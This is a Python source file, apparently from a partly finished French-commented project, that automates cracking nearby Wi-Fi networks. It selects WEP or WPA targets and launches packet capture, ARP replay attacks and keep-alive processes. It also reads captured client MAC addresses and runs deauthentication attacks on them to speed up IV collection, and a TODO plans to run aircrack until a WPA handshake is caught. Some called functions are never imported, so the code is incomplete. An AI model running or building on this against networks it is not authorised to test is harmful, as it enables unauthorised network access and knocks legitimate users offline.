#!/usr/bin/python
# -*- coding: utf-8 -*-

from utils import network_listening, arp_attack, keep_alive_packet
import xml.etree.ElementTree as ET
import os
import signal
import time
import logging


class ListeningManager():
    """
    This class is the main operator.
    """
    def __init__(self, maxListening = 1):
        """
        :param maxListening: Listening worker number limit

        .. note:: It creates also 3 fields to handle the pids of processing threads
        """
        self.maxListening = maxListening
        self.listeningList = []
        self.networkTable = []

    def updateNetworkTable(self, table):
        """
        This method sets the network table.

        :param table: The updated network list
        """
        self.networkTable = table

    def updateListening(self):
        """
        This method updates the listening list.
        Called just after the :func:`updateNetworkTable`.
        """
        tmpTable = self.networkTable[:self.maxListening]
        for network in tmpTable:
            tmp_network = None
            if network._Encryption.find('WEP') != -1 :
                tmp_network = WEPListening(network)
            elif network._Encryption.find('WPA') != -1 :
                tmp_network = WPAListening(network)
            if tmp_network != None and tmp_network not in self.listeningList:
                self.listeningList.append(tmp_network)
                tmp_network.startListening()

        """
        TODO: Retirer les réseaux en trop dans la liste
        # Code non testé !!!
        for network in self.listeningList:
            if network.box not in tmpTable:
                index = self.listeningList.index(network)
                self.listeningList.pop(index)
                network.stopListening()
        """

        for qq in self.listeningList:
            qq.update()

    def destroy(self):
        """
        Destroy all the listening threads (Safe exit)
        """
        for listen in self.listeningList:
            listen.stopListening()


class WEPListening():
    """
    WEPListening is a specific class to handle the cracking of a Wifibox
    which uses WEP security

    .. todo: Create a SuperClass to merge WEPListening and WPAListening common behaviours
    """
    def __init__(self, box):
        """
        :param box: The box to crack

        .. note:: It creates also 3 fields to handle the pids of processing threads
        """
        self.box = box
        self.focus_listen_pid = -1
        self.arp_pid = -1
        self.keep_alive_pid = -1

    def startListening(self):
        logging.info("Starting listening on %s", self.box._ESSID)
        dir_path = "TestBox/" + self.box._ESSID
        if not os.path.isdir(dir_path):
            os.mkdir(dir_path)
        self.focus_listen_pid = network_listening(self.box)
        self.keep_alive_pid = keep_alive_packet(self.box)
        self.arp_pid = arp_attack(self.box)
        self.speed_up_process(self.box)

    """ forte probabilit� de necessite de debugger ce code
        process de deauthentification pour accelerer l'obtiention d'iv
    """
    def speed_up_process(self, box):
        tab_client = []
        dir_name = "TestBox"
        nom_ecoute = "record"
        path = dir_name + "/" + box._ESSID
        nom_fichier_xml_ecoute_local = path + "/" + nom_ecoute + "-01.kismet.netxml"
        try:
            sub_tree = ET.parse(nom_fichier_xml_ecoute_local)
            sub_root = sub_tree.getroot()
            for child in sub_root:
                for c_tmp in child.findall('wireless-client'):
                    mac_client = c_tmp.find('client-mac').text
                    client = client_wifi(mac_client)
                    tab_client.append(client)
            for client in tab_client:
                deauthentication_attack(self.box, client)
        except:
            logging.critical("Cannot open or parse %s", nom_fichier_xml_ecoute_local)

    def update(self):
        self.speed_up_process(self.box)

    def stopListening(self):
        logging.info("Stopping listening on %s", self.box._ESSID)
        os.killpg(self.focus_listen_pid, signal.SIGTERM)
        os.killpg(self.arp_pid, signal.SIGTERM)

    def __eq__(self, other):
        return self.box == other.box

class WPAListening():
    """
    WPAListening is a specific class to handle the cracking of a Wifibox
    which uses WPA security

    .. todo: Create a SuperClass to merge WEPListening and WPAListening common behaviours
    """
    def __init__(self,box):
        """
        :param box: The box to crack

        .. note:: It creates also 2 fields to handle the pids of processing threads
        """
        self.box = box
        self.focus_listen_pid = -1
        self.aircrack_pid = -1

    def startListening(self):
        logging.info("Starting listening on %s", self.box._ESSID)
        dir_path = "TestBox/" + self.box._ESSID
        if not os.path.isdir(dir_path):
            os.mkdir(dir_path)
        self.focus_listen_pid = network_listening(self.box)
        # TODO : lancer aircrack jusqu'a ce que ca marche (ie on chope une handshake)

    def update(self):
        pass

    def stopListening(self):
        logging.info("Stopping listening on %s", self.box._ESSID)
        os.killpg(self.focus_listen_pid, signal.SIGTERM)
        # os.killpg(self.aircrack_pid, signal.SIGKILL)

    def __eq__(self, other):
        return self.box == other.box
